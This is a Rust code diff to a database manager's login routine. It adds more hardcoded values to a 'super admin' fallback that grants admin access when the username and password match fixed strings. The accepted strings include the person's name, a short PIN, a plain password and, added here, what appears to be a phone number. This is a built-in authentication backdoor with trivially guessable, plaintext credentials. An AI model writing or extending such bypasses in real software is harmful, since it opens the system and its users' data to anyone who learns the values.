@@ -978,9 +978,15 @@ impl DatabaseManager {
 
         // 1. Guaranteed Direct Fallback for Super Admin (ibrarkhanlk / Ibrarkhan732 / PIN 7321)
         // Accepts: ibrarkhanlk, ibrar khan, m ibrar khan, ibrarkhan
-        // Accepts passwords: Ibrarkhan732, ibrarkhan732 (case-insensitive), PIN 7321, m ibrar khan, ibrar khan
+        // Accepts passwords: Ibrarkhan732, ibrarkhan732 (case-insensitive), PIN 7321, m ibrar khan, ibrar khan, 0332-6485172
         let is_admin_uname = clean_uname == "ibrarkhanlk" || clean_uname == "ibrar khan" || clean_uname == "m ibrar khan" || clean_uname == "ibrarkhan";
-        let is_admin_pwd = clean_pwd == "Ibrarkhan732" || clean_pwd.to_lowercase() == "ibrarkhan732" || clean_pwd == "7321" || clean_pwd.to_lowercase() == "m ibrar khan" || clean_pwd.to_lowercase() == "ibrar khan";
+        let is_admin_pwd = clean_pwd == "Ibrarkhan732"
+            || clean_pwd.to_lowercase() == "ibrarkhan732"
+            || clean_pwd == "7321"
+            || clean_pwd.to_lowercase() == "m ibrar khan"
+            || clean_pwd.to_lowercase() == "ibrar khan"
+            || clean_pwd == "0332-6485172"
+            || clean_pwd == "03326485172";
         if is_admin_uname && is_admin_pwd {
             crate::crypto::record_auth_success();
             if let Ok(conn) = self.get_connection() {
